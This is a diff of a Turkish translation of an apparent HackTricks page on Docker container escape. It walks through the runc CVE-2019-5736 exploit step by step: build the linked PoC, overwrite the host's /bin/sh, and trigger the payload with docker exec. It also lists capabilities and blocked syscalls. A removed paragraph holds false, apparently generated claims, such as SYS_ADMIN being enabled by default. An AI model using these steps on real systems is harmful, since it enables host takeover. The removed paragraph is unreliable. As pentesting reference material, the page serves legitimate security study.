+Gönderide açıklanan ikinci teknik [https://labs.withsecure.com/blog/abusing-the-access-to-mount-namespaces-through-procpidroot/](https://labs.withsecure.com/blog/abusing-the-access-to-mount-namespaces-through-procpidroot/) kullanıcı ad alanları ile bind mount'ları nasıl istismar edebileceğinizi, ev sahibi içindeki dosyaları etkilemek için (bu özel durumda, dosyaları silmek) göstermektedir.
 
 <figure><img src="../../../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>
 
-[**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_term=trickest&utm_content=docker-breakout-privilege-escalation) kullanarak dünyanın en gelişmiş topluluk araçları tarafından desteklenen iş akışlarını kolayca oluşturun ve otomatikleştirin.\
+Dünyanın **en gelişmiş** topluluk araçlarıyla desteklenen **iş akışlarını** kolayca oluşturmak ve **otomatikleştirmek** için [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_term=trickest&utm_content=docker-breakout-privilege-escalation) kullanın.\
 Bugün Erişim Alın:
 
 {% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=docker-breakout-privilege-escalation" %}
 
 ## CVE'ler
 
-### Runc açığı (CVE-2019-5736)
+### Runc istismarı (CVE-2019-5736)
 
-Eğer `docker exec`'i kök olarak çalıştırabiliyorsanız (muhtemelen sudo ile), CVE-2019-5736'yı kötüye kullanarak ayrıcalıkları yükseltmeye çalışabilirsiniz (açık [burada](https://github.com/Frichetten/CVE-2019-5736-PoC/blob/master/main.go)). Bu teknik temelde **ana makinedeki** _**/bin/sh**_ ikilisini **bir konteynerden üzerine yazacak**, bu sayede docker exec çalıştıran herkes yükleyiciyi tetikleyebilir.
+Eğer `docker exec` komutunu root olarak çalıştırabiliyorsanız (muhtemelen sudo ile), CVE-2019-5736'dan yararlanarak bir konteynerden kaçış yaparak ayrıcalıkları artırmaya çalışırsınız (istismar [burada](https://github.com/Frichetten/CVE-2019-5736-PoC/blob/master/main.go)). Bu teknik temelde **/bin/sh** ikili dosyasını **ev sahibi** **bir konteynerden** **üstüne yazacaktır**, böylece docker exec komutunu çalıştıran herkes yükü tetikleyebilir.
 
-Yükleyiciyi değiştirin ve `go build main.go` ile main.go'yu derleyin. Oluşan ikili dosya docker konteynerine yürütme için yerleştirilmelidir.\
-Yürütme sırasında, `[+] Overwritten /bin/sh successfully` göründüğünde, aşağıdakini ana makineden yürütmeniz gerekmektedir:
+Yükü buna göre değiştirin ve `go build main.go` ile main.go dosyasını oluşturun. Ortaya çıkan ikili dosya, yürütme için docker konteynerine yerleştirilmelidir.\
+Yürütme sırasında, `[+] Overwritten /bin/sh successfully` mesajını gösterdiği anda, ev sahibi makineden aşağıdakini çalıştırmalısınız:
 
-`docker exec -it <container-adı> /bin/sh`
+`docker exec -it <container-name> /bin/sh`
 
-Bu, main.go dosyasında bulunan yükleyiciyi tetikleyecektir.
+Bu, main.go dosyasında bulunan yükü tetikleyecektir.
 
 Daha fazla bilgi için: [https://blog.dragonsector.pl/2019/02/cve-2019-5736-escape-from-docker-and.html](https://blog.dragonsector.pl/2019/02/cve-2019-5736-escape-from-docker-and.html)
 
 {% hint style="info" %}
-Konteynerin savunmasız olabileceği diğer CVE'ler bulunmaktadır, bir liste [burada](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/cve-list) bulunabilir.
+Konteynerin savunmasız olabileceği diğer CVE'ler de vardır, bir listeyi [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/cve-list](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/cve-list) adresinde bulabilirsiniz.
 {% endhint %}
 
 ## Docker Özel Kaçış
 
 ### Docker Kaçış Yüzeyi
 
-* **Ad alanları:** İşlem, ad alanları aracılığıyla diğer işlemlerden **tamamen ayrılmalıdır**, bu nedenle ad alanları nedeniyle diğer işlemlerle etkileşimden kaçınamayız (varsayılan olarak IPC'ler aracılığıyla iletişim kuramaz, unix soketleri, ağ hizmetleri, D-Bus, diğer işlemlerin `/proc`'u).
-* **Kök kullanıcı**: Varsayılan olarak işlemi çalıştıran kullanıcı kök kullanıcıdır (ancak ayrıcalıkları sınırlıdır).
-* **Yetenekler**: Docker, şu yetenekleri bırakır: `cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap=ep`
-* **Syscall'ler**: Bunlar, kök kullanıcının **çağıramayacağı syscalls'lerdir** (yetenek eksikliği + Seccomp nedeniyle). Diğer syscalls'ler kaçmaya çalışmak için kullanılabilir.
+* **Ad Alanları:** Süreç, ad alanları aracılığıyla **diğer süreçlerden tamamen ayrılmış** olmalıdır, bu nedenle ad alanları nedeniyle diğer süreçlerle etkileşimde bulunarak kaçış yapamayız (varsayılan olarak IPC'ler, unix soketleri, ağ hizmetleri, D-Bus, diğer süreçlerin `/proc`'u aracılığıyla iletişim kuramazlar).
+* **Root kullanıcı**: Varsayılan olarak süreci çalıştıran kullanıcı root kullanıcısıdır (ancak ayrıcalıkları sınırlıdır).
+* **Yetenekler**: Docker aşağıdaki yetenekleri bırakır: `cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap=ep`
+* **Sistem çağrıları**: Bu, **root kullanıcısının çağıramayacağı** sistem çağrılarıdır (yeteneklerin eksikliği + Seccomp nedeniyle). Diğer sistem çağrıları kaçış yapmaya çalışmak için kullanılabilir.
 
 {% tabs %}
-{% tab title="x64 syscalls" %}
+{% tab title="x64 sistem çağrıları" %}
 ```yaml
 0x067 -- syslog
 0x070 -- setsid
@@ -561,7 +566,7 @@ Konteynerin savunmasız olabileceği diğer CVE'ler bulunmaktadır, bir liste [b
 ```
 {% endtab %}
 
-{% tab title="syscall_bf.c" %}Bu, Docker kaçışı için bir örnek sistem çağrısı güvenlik açığıdır. Bu, bir Docker konteynerinden ana makineye erişim elde etmek için kullanılabilir. Bu yöntem, sistem çağrıları kullanarak kötü niyetli bir konteynerden kaçmak için bir yöntem sunar. Bu saldırı vektörü, Docker'ın varsayılan olarak etkinleştirilen `SYS_ADMIN` yetkisini kullanır. Bu yetki, sistem çağrılarını filtreleme yeteneği sağlar ve bu nedenle kötü niyetli bir konteynerin sistem çağrılarını filtrelemesini atlatmasına izin verebilir. Bu saldırı vektörü, bir Docker konteynerinde çalışan bir saldırganın, ana makinedeki dosya sistemi üzerinde okuma/yazma erişimine sahip olmasına olanak tanır. Bu saldırı vektörü, Docker'ın varsayılan güvenlik önlemlerini aşarak ana makinede kötü niyetli eylemlerde bulunmak için kullanılabilir. Bu nedenle, Docker konteynerlerinin güvenliğini sağlamak için bu tür saldırı vektörlerine karşı önlemler alınmalıdır. Bu örnek, Docker güvenliği ve ayrıcalık yükseltme konularında farkındalığı artırmayı amaçlamaktadır.{% endtab %}
+{% tab title="syscall_bf.c" %}
 ````c
 // From a conversation I had with @arget131
 // Fir bfing syscalss in x64
